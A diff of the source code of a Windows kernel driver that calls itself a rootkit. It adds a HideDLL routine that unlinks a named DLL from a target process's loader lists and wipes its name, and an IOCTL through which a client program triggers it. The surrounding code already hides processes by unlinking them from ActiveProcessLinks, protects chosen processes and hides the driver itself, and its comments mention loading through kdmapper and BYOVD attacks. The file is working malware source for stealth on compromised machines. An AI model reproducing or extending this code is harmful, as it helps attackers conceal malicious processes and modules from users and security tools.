@@ -1,11 +1,12 @@
 #include "externs.h"
 #include <wdm.h>
+#include "WindowsTypes.hpp"
 #pragma warning(push)
 #pragma warning(disable: 4100)  // Unreferenced formal parameter
 #pragma warning(disable : 4099)
-// #define DRL // Uncomment if you want to reflectively load the driver.
+//#define DRL // Uncomment if you want to reflectively load the driver.
 #ifndef DRL
-#define DL
+#define DL // if DL is defined then the driver is loaded via a service, like in normal routines.
 #endif
 // debug printing
 void debug_print(PCSTR text) {
@@ -14,7 +15,6 @@ void debug_print(PCSTR text) {
 /*
 Functions 
 */
-
 ULONG TOKEN_OFFSET = 0;
 ULONG ACTIVE_PROCESS_LINKS_OFFSET = 0;
 ULONG IMAGE_FILE_NAME_OFFSET = 0;
@@ -110,6 +110,140 @@ NTSTATUS ProtectProcess(UINT32 PID) {
     return status;
 }
 
+// Function to extract only filenames from the fullpath - example: C:\Users\matanel\Desktop\file.exe TO file.exe
+WCHAR* ExtractFileName(const WCHAR* fullPath) {
+    // Find the last backslash.
+    const WCHAR* lastSlash = wcsrchr(fullPath, L'\\');
+    // If the backslash is NOT NULL, it will point to the next letter (which is the start of the filename), and truncate everything behind it so only the filename is left.
+    return lastSlash ? (WCHAR*)(lastSlash + 1) : (WCHAR*)fullPath;
+}
+
+// Modify the HideDLL function's comparison logic
+VOID HideDLL(UINT32 PID, const WCHAR* DLLName) {
+    // Get the build numbers and offsets if needed to be used here.
+    if (GetImageFileNameOffset() == 0) {
+        debug_print("[!-!] Aborting HideDLL function, unknown build.");
+        return;
+    }
+    // Check if the DLLName address is valid, to avoid bsods.
+    if (!DLLName || !MmIsAddressValid((PVOID)DLLName)) {
+        debug_print("[!] Invalid DLL name pointer\n");
+        return;
+    }
+    // Debug prints, used to fix the function.
+    DbgPrint("[+] DLLName supplied by client: %ws\n", DLLName);
+    debug_print("[+] HideDLL function called.\n");
+
+    // Add validation for DLL name format
+    size_t dllNameLen = wcslen(DLLName);
+    if (dllNameLen < 5) { // Minimum "x.dll"
+        debug_print("[!] DLL name too short\n");
+        return;
+    }
+    // Initilizations.
+    PVOID moduleBase;
+    KAPC_STATE state;
+    PLDR_DATA_TABLE_ENTRY entry = nullptr;  // Initialize to nullptr
+    NTSTATUS status;
+    LARGE_INTEGER time = { 0 };
+    time.QuadPart = -10011 * 10 * 1000;
+    // Get the PEB structure of the Process using it's PID and undocumented functions.
+    PEPROCESS pTargetProcess;
+    // First get EPROCESS of process.
+    status = PsLookupProcessByProcessId(UlongToHandle(PID), &pTargetProcess);
+    if (status != STATUS_SUCCESS) {
+        debug_print("[-] Failed to get EPROCESS of PID, aborting HideDLL function.\n");
+        return;
+    }
+    // Attach the kernel current thread to the process paged memory thread, to modify it's memory (since windows uses Virtual Pages for memory).
+    KeStackAttachProcess(pTargetProcess, &state);
+    // Get it's PEB.
+    PREALPEB PEB = (PREALPEB)PsGetProcessPeb(pTargetProcess);
+    // Checks.
+    if (!PEB) {
+        debug_print("[-] Failed to get PEB of target process, aborting HideDLL function.\n");
+        KeUnstackDetachProcess(&state);
+        ObDereferenceObject(pTargetProcess);
+        return;
+    }
+    // Now we wait until the PEB LoaderData (LDR) is available to start traversing.
+    for (int i = 0; !PEB->LoaderData && i < 10; i++) {
+        KeDelayExecutionThread(KernelMode, FALSE, &time);
+    }
+    // More checks.
+    if (!PEB->LoaderData) {
+        debug_print("[-] Failed to get LDR (Loader Data) of target process's PEB, aborting HideDLL function.\n");
+        KeUnstackDetachProcess(&state);
+        ObDereferenceObject(pTargetProcess);
+        return;
+    }
+    if (!&PEB->LoaderData->InLoadOrderModuleList) {
+        debug_print("[-] Failed to get loaded DLL list (LoadedModuleList) inside of LoaderData, aborting HideDLL function.\n");
+        KeUnstackDetachProcess(&state);
+        ObDereferenceObject(pTargetProcess);
+        return;
+    }
+    // Enumerate the DLL's inside of the process to find our requested DLL.
+    // Basically move through all DLL's in the doubly linked list.
+    status = STATUS_NOT_FOUND; // Base status, that it is not found when we for loop the whole thing, so later we can check if found to do more stuff.
+    for (PLIST_ENTRY pListEntry = PEB->LoaderData->InLoadOrderModuleList.Flink;
+        pListEntry != &PEB->LoaderData->InLoadOrderModuleList;
+        pListEntry = pListEntry->Flink) {
+        // Get the address of the InLoadOrderLinks.
+        entry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+        if (entry && entry->FullDllName.Length > 0) {
+            WCHAR dllNameBuffer[256];
+            // Copy the buffer of the FullDllName safely to the variable.
+            wcsncpy_s(dllNameBuffer, entry->FullDllName.Buffer, entry->FullDllName.Length / sizeof(WCHAR));
+            // Null-Terminate it.
+            dllNameBuffer[entry->FullDllName.Length / sizeof(WCHAR)] = L'\0';
+            // Extract just the filename from the full path
+            const WCHAR* entryFileName = ExtractFileName(dllNameBuffer);
+
+            // Compare filenames case-insensitively
+            if (_wcsicmp(entryFileName, DLLName) == 0) {
+                debug_print("[+] Found matching DLL, unlinking from lists\n");
+                moduleBase = entry->DllBase;
+                // If found, start unlinking from the doubly-lined list.
+                FlinkBlinkHide(&entry->InLoadOrderLinks);
+                FlinkBlinkHide(&entry->InInitializationOrderLinks);
+                FlinkBlinkHide(&entry->InMemoryOrderLinks);
+                FlinkBlinkHide(&entry->HashLinks);
+                status = STATUS_SUCCESS;
+                break;
+            }
+
+            // Updated debug logging to show actual comparison
+            DbgPrint("DEBUG: Comparing DLL filename: %ws with Target: %ws\n", entryFileName, DLLName);
+        }
+    }
+    if (status == STATUS_SUCCESS) {
+        // Zero out the DLLBase
+        moduleBase = nullptr;
+        RtlZeroMemory(entry->FullDllName.Buffer, sizeof(entry->FullDllName.Buffer));
+        RtlZeroMemory(entry->BaseDllName.Buffer, sizeof(entry->BaseDllName.Buffer));
+        debug_print("[+] Successfully hidden the DLL from the process!\n");
+    }
+    else {
+        debug_print("[-] Status is not STATUS_SUCCESS in HideDLL function.\n");
+        // Only print debug info if entry is valid
+        if (entry && MmIsAddressValid(entry)) {
+            WCHAR dllnamefull[256];
+            wcsncpy_s(dllnamefull, entry->FullDllName.Buffer, entry->FullDllName.Length / sizeof(WCHAR));
+            dllnamefull[entry->FullDllName.Length / sizeof(WCHAR)] = L'\0'; // Null-terminate
+            DbgPrint("DEBUG: FullDllName.buffer: %ws", dllnamefull);
+            WCHAR dllnameinloop[256];
+            wcsncpy_s(dllnameinloop, entry->FullDllName.Buffer, entry->FullDllName.Length / sizeof(wchar_t) - 4);
+            DbgPrint("DEBUG: FullDllName.buffer INLOOP: %ws", dllnameinloop);
+        }
+    }
+    // Detach from the process's memory.
+    KeUnstackDetachProcess(&state);
+    ObDereferenceObject(pTargetProcess); // Cleanup - Always remember to cleanup, we don't want memory leaks.
+    debug_print("[*] Exiting HideDLL Function.\n");
+    return;
+}
+
 VOID HideProcess(UINT32 PID) {
     if (GetImageFileNameOffset() == 0) {
         debug_print("[!-!] Aborting HideProcess, unknown build.");
@@ -130,7 +264,7 @@ VOID HideProcess(UINT32 PID) {
 
     // Calculate the pointer to the current process's ActiveProcessList list entry.
     PLIST_ENTRY CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
-
+    
     // Calculate the address of the current pointer PID field. (basically, gets his PID from within the current EPROCESS structure, using the known offset.)
     PUINT32 CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
 
@@ -285,9 +419,12 @@ namespace Rootkit {
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x698, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
         constexpr ULONG ProtectProcess =
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x699, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG HideDLL =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x700, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
     }
     struct Request {
         HANDLE process_id;
+        WCHAR DLLName[256];
     };
 
     NTSTATUS create(PDEVICE_OBJECT device_object, PIRP Irp) {
@@ -336,6 +473,7 @@ namespace Rootkit {
         // finally handle the control code sent
         const ULONG control_code = stack_irp->Parameters.DeviceIoControl.IoControlCode;
         HANDLE pid = request->process_id;
+        WCHAR* DLLName = request->DLLName;
         switch (control_code) {
         case codes::HideDriver:
             DriverObject = IoGetCurrentIrpStackLocation(Irp)->DeviceObject->DriverObject;
@@ -357,6 +495,9 @@ namespace Rootkit {
         case codes::ProtectProcess:
             ProtectProcess(HandleToUlong(pid));
             break;
+        case codes::HideDLL:
+            HideDLL(HandleToUlong(pid), DLLName);
+            break;
         default:
             // something is horribly wrong
             debug_print("[!] Unknown control code received!");
@@ -369,6 +510,25 @@ namespace Rootkit {
         return status;
     }
 }
+
+VOID UnloadDriver(PDRIVER_OBJECT DriverObject) {
+    debug_print("[+] UnloadDriver called.\n");
+
+    // Delete symbolic link
+    UNICODE_STRING symbolic_link = RTL_CONSTANT_STRING(L"\\DosDevices\\rootkit");
+    IoDeleteSymbolicLink(&symbolic_link);
+    debug_print("[+] Symbolic link deleted.\n");
+
+    // Delete device object(s)
+    PDEVICE_OBJECT device_object = DriverObject->DeviceObject;
+    while (device_object) {
+        PDEVICE_OBJECT next_device = device_object->NextDevice;
+        IoDeleteDevice(device_object);
+        device_object = next_device;
+    }
+    debug_print("[+] Device object(s) deleted.\n");
+}
+
 
 // The actual entry point, since we are loading with kdmapper, in real life, when you use lets say a BYOVD attack, you would use the normal DriverEntry() with arguments (look in msdn website)
 NTSTATUS DriverMain(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path) {
@@ -417,6 +577,9 @@ NTSTATUS DriverMain(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path)
 
     ClearFlag(device_object->Flags, DO_DEVICE_INITIALIZING);
 
+#ifdef DL
+    driver_object->DriverUnload = UnloadDriver;
+#endif
     debug_print("[+] Device initialized successfully.\n");
 
     return status;
@@ -428,7 +591,8 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
     UNICODE_STRING driver_name = {};
     RtlInitUnicodeString(&driver_name, L"\\Driver\\rootkit");
     /*
-	Remember to uncomment #define DRL in the top if you want to load reflectively (via KDMapper for example)
+	In a normal driver, we wouldn't do IoCreateDriver, since this is manual mapping (using KDMapper), we need to use this function to create the driver.
+    But if this is used as a service in windows, Windows already does this for us, meaning all of the code in DriverMain above will exist here in DriverEntry.
     */
 #ifdef DRL
     UNREFERENCED_PARAMETER(DriverObject);
